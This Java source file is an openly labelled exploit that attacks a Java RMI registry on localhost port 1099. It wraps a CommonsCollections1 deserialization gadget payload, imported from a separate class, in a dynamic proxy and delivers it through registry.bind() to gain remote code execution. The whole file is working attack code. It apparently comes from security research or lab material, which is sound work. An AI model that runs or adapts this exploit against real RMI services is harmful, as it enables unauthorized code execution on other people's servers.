package nth347.exploits;

import nth347.payloads.CommonsCollections1;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * RMI client is used for attacking RMI registry on 127.0.0.1:1099
 * It uses bind()/rebind() method to carry out the attack
 */
public class RMIRegistryExploit1 {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);  // registry = RegistryImpl_Stub

        Remote remote = Remote.class.cast(
                Proxy.newProxyInstance(
                        Remote.class.getClassLoader(),
                        new Class[] {Remote.class},
                        (InvocationHandler) CommonsCollections1.getPayload()
                )
        );

        registry.bind("RMIRegistryExploit1", remote);
        //registry.rebind("RMIRegistryExploit1", remote);
    }
}
